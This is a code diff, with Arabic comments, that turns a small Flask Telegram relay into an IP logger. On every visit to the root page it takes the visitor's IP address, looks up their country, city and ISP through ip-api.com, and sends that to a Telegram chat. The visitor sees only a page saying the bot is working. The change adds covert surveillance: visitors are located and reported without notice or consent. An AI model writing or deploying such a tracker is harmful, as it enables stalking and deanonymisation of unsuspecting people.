@@ -1,31 +1,43 @@
 import os
-import telebot
+import requests
 from flask import Flask, request
 
-# قراءة المتغيرات من البيئة
-TOKEN = os.environ.get("TELEGRAM_TOKEN")
-CHAT_ID = os.environ.get("CHAT_ID")
-
-# تحقق من وجود التوكن والآي دي
-if not TOKEN or not CHAT_ID:
-    raise ValueError("❌ تأكد من ضبط TELEGRAM_TOKEN و CHAT_ID في إعدادات البيئة على Render.")
-
-bot = telebot.TeleBot(TOKEN)
 app = Flask(__name__)
 
-@app.route("/", methods=["GET"])
-def index():
-    return "🤖 البوت يعمل بنجاح على Render!"
+# بيانات بوت تيليجرام
+TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
+CHAT_ID = os.getenv("CHAT_ID")
 
-@app.route("/send", methods=["POST"])
-def send():
+# رابط إرسال الرسائل للبوت
+TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+
+def get_location(ip):
     try:
-        data = request.json
-        message = data.get("message", "🔔 لا توجد رسالة محددة.")
-        bot.send_message(CHAT_ID, message)
-        return "✅ تم الإرسال", 200
+        res = requests.get(f"http://ip-api.com/json/{ip}")
+        data = res.json()
+        if data["status"] == "success":
+            location = f"🌍 IP: {ip}\nالبلد: {data['country']}\nالمدينة: {data['city']}\nالمزود: {data['isp']}"
+        else:
+            location = f"📡 IP: {ip}\nلم يتم العثور على موقع."
+        return location
     except Exception as e:
-        return f"❌ خطأ أثناء الإرسال: {str(e)}", 500
+        return f"❌ فشل في جلب الموقع: {str(e)}"
 
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=10000)
+def send_to_telegram(message):
+    try:
+        requests.post(TELEGRAM_API, data={
+            "chat_id": CHAT_ID,
+            "text": message
+        })
+    except:
+        pass
+
+@app.route('/')
+def index():
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    message = get_location(ip)
+    send_to_telegram(message)
+    return "<h2>✅ البوت يعمل بنجاح</h2>"
+
+if __name__ == '__main__':
+    app.run()
